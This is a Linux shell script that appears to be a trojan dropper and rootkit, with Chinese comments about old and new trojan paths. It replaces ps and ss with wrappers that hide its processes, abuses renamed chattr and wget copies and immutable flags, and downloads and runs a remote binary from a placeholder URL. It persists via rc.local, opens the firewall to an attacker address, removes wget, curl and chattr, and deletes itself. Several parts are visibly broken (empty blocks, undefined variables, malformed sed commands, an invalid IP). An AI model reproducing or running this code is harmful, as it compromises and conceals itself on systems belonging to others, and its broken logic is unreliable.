#!/bin/sh
path=`pwd`
exit0="exit 0"
ips="/usr/bin/ips"
iss="/usr/bin/iss"
Net="/usr/bin/nets"
Get="/usr/bin/dget"
Lok="/usr/bin/lockr"
Gurl="/usr/bin/gurl"
deny="/etc/deny.bak"
allow="/etc/allow.bak"
fileback="/usr/bin/x86_64-linux-gnu-cxx"
issbak="/usr/bin/dgkpd/ss"
ipsbak="/usr/bin/dgkpd/ss"
Netbak="/usr/bin/dgkpd/netstat"
Config="/etc/init.d/Me8ing.conf"

Runkillallconnect()
{
    killpid=`nets -apent 2>/dev/null |grep '10.1.1.1:32222'|cut -d / -f 1|awk '{print $9}'`
    kill $killpid 2>/dev/null;kill -3 $killpid 2>/dev/null;kill -9 $killpid 2>/dev/null
    killall $tempfile;pkill $tempfile;lockr -i /usr/bin/;lockr -i $filetemp;rm -f $filetemp
    if [ -z "`cat $Config|grep $tempfile`" ]; then
        lockr -i /etc/init.d/;lockr -i $Config
        echo $filename $tempbash 10.1.1.1 > $Config;lockr +i $Config > /dev/null 2>&1
    else
        lockr -i $Config;sed -i "s|$tempfile|$filename|" $Config;lockr +i $Config > /dev/null 2>&1
    fi
    if [ -z "`cat /bin/ps|grep $tempfile`" ]; then
        lockr -i /bin;lockr -i /bin/ps;echo '#!/bin/sh' > /bin/ps;echo 'for arg in "$*";do' >> /bin/ps
        echo 'ips $arg|grep -v "'$tempbash'"|grep -v "'$filename'"|grep -v "ips"|grep -v "grep"' >> /bin/ps
        echo 'done;exit' >> /bin/ps;chmod 777 /bin/ps;lockr +i /bin/ps > /dev/null 2>&1
    else
        lockr -i /bin/ps;sed -i "s|$tempfile|$filename|" /bin/ps;lockr +i /bin/ps > /dev/null 2>&1
    fi

}

if [ ! -f $Lok ];then
    lockr -i /usr/bin
    cp -f /usr/bin/chattr /usr/bin/lockr
    cp -f /usr/bin/chattr /usr/bin/.locks
    cp -f /usr/bin/.locks /usr/bin/lockr
    chmod 777 /usr/bin/lockr
    chmod 777 /usr/bin/.locks
    lockr +i /usr/bin/lockr
    lockr +i /usr/bin/.locks
fi


if [ ! -f $Get ];then
    lockr -i /usr/bin
    cp -f /usr/bin/wget /usr/bin/vget
    cp -f /usr/bin/wget /usr/bin/.bget
    cp -f /usr/bin/.bget /usr/bin/vget
    chmod 0755 /usr/bin/vget
    chmod 0755 /usr/bin/.bget
    lockr +i /usr/bin/vget
    lockr +i /usr/bin/.bget
fi

if [ ! -f $Gurl ];then
    lockr -i /usr/bin

fi

if [ -f /usr/bin/pkill ];then
	lockr -i /usr/bin/pkill;chmod 777 /usr/bin/pkill
    lockr +i /usr/bin/pkill >/dev/null 2>&1
fi

if [ -f /usr/bin/nohup ];then
    lockr -i /usr/bin/nohup;chmod 777 /usr/bin/nohup
    lockr +i /usr/bin/nohup >/dev/null 2>&1
fi

if [ -f /usr/bin/killall ];then
    lockr -i /usr/bin/killall;chmod 777 /usr/bin/killall
    lockr +i /usr/bin/killall >/dev/null 2>&1
fi

if [ ! -f $Config ];then
    lockr -i /usr/bin/
    lockr -i /etc/init.d/    
	echo "hello world" > $Config
    tempfile=`cat $Config | awk '{print $1}'`
	filetemp="/usr/bin/$tempfile" #现马的路径
	filename=`date +%s%N | md5sum | head -c 10`
	filepath="/usr/bin/$filename" #新马的路径
	tempbash=`cat $Config | awk '{print $2}'`
	bashtemp="/usr/bin/$tempbash" #现脚本路径
	bashname=`date +%s%N | md5sum | head -c 10`
	bashpath="/usr/bin/$bashname" #新脚本路径
    
	
else
    tempfile=`cat $Config | awk '{print $1}'`
	filetemp="/usr/bin/$tempfile" #现马的路径
	filename=`date +%s%N | md5sum | head -c 10`
	filepath="/usr/bin/$filename" #新马的路径
	tempbash=`cat $Config | awk '{print $2}'`
	bashtemp="/usr/bin/$tempbash" #现脚本路径
	bashname=`date +%s%N | md5sum | head -c 10`
	bashpath="/usr/bin/$bashname" #新脚本路径


    if [ $0 != "$bashtemp" ];then
    
    
    fi


fi



if [ -f /usr/sbin/ss ];then
pwd
fi


if [ -f /bin/ss ];then
	if [ ! -f "$iss" ];then
		if [ ! -f "$issbak" ];then
			lockr -i /usr/bin/;mkdir /usr/bin/dpkgd/
			cp -f /bin/ss $issbak
			cp -f /bin/ss $iss
		else
			cp -f $issbak $iss
		fi
		chmod 777 $iss;chmod 777 $issbak
		lockr +i $issbak >/dev/null 2>&1
		lockr +i $iss >/dev/null 2>&1
	else
		if [ ! -f "$issbak" ];then
			lockr -i /usr/bin/;cp -f $iss $issbak
			lockr +i $issbak >/dev/null 2>&1
		fi	
		if [ -z "`cat /bin/ss | grep $Address`" ]; then
			lockr -i /bin/;lockr -i /bin/ss
			echo '#!/bin/sh' > /bin/ss
			echo 'iss|grep -v "'$Address'"' >> /bin/ss
			echo 'exit' >> /bin/ss
			chmod 777 /bin/ss;lockr +i /bin/ss >/dev/null 2>&1
		fi
	fi
fi


if [ -f /bin/netstat ];then
pwd
fi

if [ -f /bin/ps ];then
	if [ ! -f "$ips" ];then
		if [ ! -f "$ipsbak" ];then
			lockr -i /usr/bin/;mkdir /usr/bin/dpkgd/
			cp -f /bin/ps $ipsbak
			cp -f /bin/ps $ips
		else
			cp -f $ipsbak $ips
		fi
		chmod 777 $ips;chmod 777 $ipsbak
		lockr +i $ipsbak >/dev/null 2>&1
		lockr +i $ips >/dev/null 2>&1
	else
		if [ ! -f "$ipsbak" ];then
			lockr -i /bin/;cp -f $ips $ipsbak
			lockr +i $ipsbak >/dev/null 2>&1
		fi	
		if [ -z "`cat /bin/ps | grep $Address`" ]; then
			lockr -i /bin/;lockr -i /bin/ps
			echo '#!/bin/sh' > /bin/ps
			echo 'for arg in "$*";do' >> /bin/ps
            echo 'ips $arg |grep -v "'$tempbash'" | grep -v "'$tempfile'" |grep -v "ips" |grep -v grep' >> /bin/ps
			echo 'done;exit' >> /bin/ps
			chmod 777 /bin/ps;lockr +i /bin/ps >/dev/null 2>&1
		fi
	fi
fi

if [ ! -f $deny ];then
    lockr -i /etc/;cp -f /etc/hosts.deny $deny
    lockr +i $deny > /dev/null 2>&1 
fi
if [ ! -f $allow ];then
    lockr -i /etc/;cp -f /etc/hosts.allow $allow
    lockr +i $allow > /dev/null 2>&1 
fi




iptable=`iptables -L INPUT | grep "$Address" | grep 'ACCEPT'`
if [ -z "$iptable" ];then
    iptables -I INPUT -s $Address -j ACCEPT
else
    iptables -D INPUT -s $Address -j DROP
fi

process=`ips -ef | grep "$tempfile" | grep -v "grep" | wc -l`
if [ $process != 1 ];then
    if [ ! -f "$filebak" ];then
        lockr -i /usr/bin/;lockr -i /usr/bin/2;rm -f /usr/bin/2
        cd /usr/bin/;dget http://google.com/2
        gurl http://google.com/2 > $filepath
        cd $path;mv -f /usr/bin/2 $filepath
    else
        cp -f $filebak $filepath
    fi
    Runkillallconnect
    chmod 777 $filepath
    nohup $filepath >/dev/null 2>&1 &
fi

if [ ! -f $fileback ];then
	#curl 10.1.1.1.1:2/2 -o $fileback 2>&1
	cp -r $filepath  $fileback
    chmod 777 $fileback
	lockr +i $fileback > /dev/null 2>&1
fi


Repeatstart=`cat /etc/rc.local | grep 'start'| wc -l`
if [ $Repeatstart != 1 ];then
    lockr -i /etc/rc.local;sed -i '/start/d' /etc/rc.local
fi
if [ -z "`cat /etc/rc.local | grep "$bashtemp"`" ]; then
    if [ -z "`cat /etc/rc.local | grep "$exit0"`" ]; then
        lockr -i /etc/;lockr -i /etc/rc.local
        echo "$bashpath start" >> /etc/rc.local
    else
        lockr -i /etc/;lockr -i /etc/rc.local
        sed -i "s|exit 0|$bashpath start|" /etc/rc.local
        echo "exit 0">>/etc/rc.local
    fi
fi




lockr -i /usr/bin;lockr -i /usr/bin/wget;rm -f /usr/bin/wget;lockr -i /usr/bin/chattr;rm -r ;lockr -i /usr/bin/curl;rm -f 
lockr /etc/;lockr /etc/hosts.deny;cp -f $deny /etc/hosts.deny;lockr +i  > /dev/null 2>$1
lockr /etc/;lockr /etc/hosts.allow;cp -f $allow /etc/hosts.deny;lockr +i  > /dev/null 2>$1

lockr /etc/init.d/; lockr -i $Config;sed -i "s|$tempbash|$bashname" $Config;lockr +i
sleep 1
lockr -i usr/bin ; cp -f $0 $bashpath;chmod 777 $bashpath;nohup $bashpath >  /dev/null 2>$1
/bin/ps ;sed -i "s|$tempbash|$bashname" /bin/ps;lockr +i
/etc/rc.local;sed -i "s|$bashtemp start|$bashpath start" /etc/rc.local

lockr -i $0
rm -f $0
#nohup $bashpath &
exit










